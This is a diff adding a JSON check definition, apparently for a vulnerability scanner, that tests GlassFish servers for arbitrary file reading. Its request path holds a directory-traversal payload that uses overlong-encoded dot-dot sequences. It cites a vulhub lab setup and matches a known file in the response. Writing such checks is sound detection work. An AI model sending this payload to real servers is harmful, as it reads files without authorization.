@@ -1,0 +1,23 @@
+{
+  "cms": "glassfish",
+  "version": "",
+  "author": "wolf",
+  "desc": "可读取服务器上的任意文件。",
+  "tags": [
+    "LFR"
+  ],
+  "refer": [
+    "https://github.com/vulhub/vulhub/tree/master/glassfish/4.1.0",
+    ""
+  ],
+  "request": {
+    "path": "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/",
+    "method": "POST",
+    "parameter": ""
+  },
+  "response": {
+    "position": "body",
+    "regex": false,
+    "match": "package-appclient.xml"
+  }
+}
